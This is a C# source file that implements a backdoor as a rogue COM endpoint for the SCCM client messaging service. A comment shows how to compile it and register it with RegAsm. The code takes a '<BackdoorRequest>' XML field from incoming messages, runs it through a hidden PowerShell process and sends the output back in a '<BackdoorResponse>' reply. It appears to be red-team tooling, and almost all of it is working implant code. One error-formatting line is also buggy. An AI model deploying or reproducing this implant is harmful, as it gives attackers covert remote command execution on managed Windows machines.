using System;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using System.IO;
using System.Text;
using ComTypes = System.Runtime.InteropServices.ComTypes;
using System.Diagnostics;
using System.Xml;


/*
# Compile
C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /t:library /out:c:\rogue.dll Endpoint.cs

# Register CLSID
C:\Windows\Microsoft.NET\Framework64\v2.0.50727\RegAsm.exe /codebase c:\rogue.dll

# Unregister CLSID
C:\Windows\Microsoft.NET\Framework64\v2.0.50727\RegAsm.exe /unregister c:\rogue.dll
*/

[ComImport]
[CompilerGenerated]
[Guid("0FB15084-AF41-11CE-BD2B-204C4F4F5020")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
public interface ITransaction
{
}

[Guid("f6fb8ec4-718c-4597-917d-2bc60ce048cf")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
public interface ICcmEndpoint {
    int Execute(IntPtr pService, IntPtr pCcmMessage, IntPtr  pContext, IntPtr pUnk);
}

[Guid("d018cf0e-86a4-4573-a804-14a6f3621867")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
public interface ICcmEndpointContext {
    
    void _VtblGap1_1();
    
    int SetComplete([In] int p0);
}

[ComImport]
[CompilerGenerated]
[Guid("5BAC5CD0-9389-4953-AD98-4D952D34BC4F")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
public interface ICcmMessage
{
    void _VtblGap1_15();

    [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
    void SetTarget([In][MarshalAs(UnmanagedType.LPWStr)] string szEndpoint);

    [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
    void GetTarget([MarshalAs(UnmanagedType.LPWStr)] out string pszEndpoint);

    [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
    void SetReplyTo([In][MarshalAs(UnmanagedType.LPWStr)] string szEndpoint);

    [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
    void GetReplyTo([MarshalAs(UnmanagedType.LPWStr)] out string pszEndpoint);

    [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
    void SetTimeout([In] uint dwTimeout);

    void _VtblGap2_5();

    [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
    void SetCorrelationID([In] ref Guid guid);

    [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
    void GetCorrelationID([Out] out Guid guid);

    [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
    void SetProperty([In][MarshalAs(UnmanagedType.LPWStr)] string szName, [In][MarshalAs(UnmanagedType.LPWStr)] string szValue);

    void _VtblGap4_1();

    [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
    void GetBodyLength(out uint pulBytes);

    void _VtblGap5_1();

    [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
    void GetBody(out byte pData, [In][Out] ref uint pulSize);

    void _VtblGap6_2();

    [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
    void SetBodyWString([In][MarshalAs(UnmanagedType.LPWStr)] string szString);

    [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
    void GetBodyWString([MarshalAs(UnmanagedType.LPWStr)] out string szString);

}

[ComImport]
[CompilerGenerated]
[Guid("5BAC5CD0-9389-4953-AD98-4D952D34BC4F")]
[CoClass(typeof(object))]
public interface CcmMessage : ICcmMessage
{
}

[ComImport]
[CompilerGenerated]
[Guid("358EEDA8-2D1A-4AB6-865B-2B6FCC3537D1")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
public interface ICcmMessaging
{
    [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
    void CreateMessage([MarshalAs(UnmanagedType.Interface)] out CcmMessage respMessage);

    [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
    void SendMessage([In][MarshalAs(UnmanagedType.Interface)] CcmMessage pMessage, [In] uint ulDeliverMode, [In][MarshalAs(UnmanagedType.Interface)] ITransaction pTransaction);
}

[ComImport]
[CompilerGenerated]
[Guid("358EEDA8-2D1A-4AB6-865B-2B6FCC3537D1")]
[CoClass(typeof(object))]
public interface CcmMessaging : ICcmMessaging
{
}


[ComVisible(true)]
[Guid("12345678-9012-3456-7890-123456789abc")]
public class CcmEndpoint : ICcmEndpoint
{

    public CcmEndpoint()
    {
    }

    public void Init()
    {
    }

    public int Execute(IntPtr pService, IntPtr pCcmMessage, IntPtr  pContext, IntPtr  pUnk)
    {
        if (pCcmMessage != IntPtr.Zero && pContext != IntPtr.Zero) {
            CcmMessage message = (CcmMessage)Marshal.GetObjectForIUnknown(pCcmMessage);
            ICcmEndpointContext context = (ICcmEndpointContext)Marshal.GetObjectForIUnknown(pContext);
            ICcmMessaging service = (ICcmMessaging)Marshal.GetObjectForIUnknown(pService);

            string respMsg = "";
            CcmMessage respMessage;
            service.CreateMessage(out respMessage);

            try {

                string bodyMsg = "";
                message.GetBodyWString(out bodyMsg);

                XmlDocument doc = new XmlDocument();
                doc.LoadXml(bodyMsg);
                XmlNode commandNode = doc.SelectSingleNode("//BackdoorRequest");

                respMsg = runCmd(commandNode.InnerText);

                string target = "";
                string replyTo = "";
                message.GetTarget(out  target);
                message.GetReplyTo(out replyTo);
                
                string replyBody = String.Format("<BackdoorResponse>{0}</BackdoorResponse>", respMsg );
                
                respMessage.SetTimeout((uint) 90);
                respMessage.SetBodyWString(replyBody);
                Guid guid = Guid.NewGuid();
                respMessage.SetCorrelationID(ref guid);
                respMessage.SetReplyTo(target);
                respMessage.SetTarget(replyTo);

                service.SendMessage(respMessage, (uint)0, null);

            } catch (Exception ex) {
                respMsg = String.Format("Error: {1}", ex.Message);

            } finally {


                Marshal.ReleaseComObject(respMessage);
                Marshal.ReleaseComObject(message);
            
                context.SetComplete(1);
                
                Marshal.ReleaseComObject(context);
                Marshal.ReleaseComObject(service);

            }
        }
        return 0;
    }

    private string runCmd(string cmd) {
        ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", cmd);
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;

        Process process = Process.Start(psi);
        string output = process.StandardOutput.ReadToEnd();
        string error = process.StandardError.ReadToEnd();

        process.WaitForExit();
        return !string.IsNullOrEmpty(error) ? error : output ;
    }
}
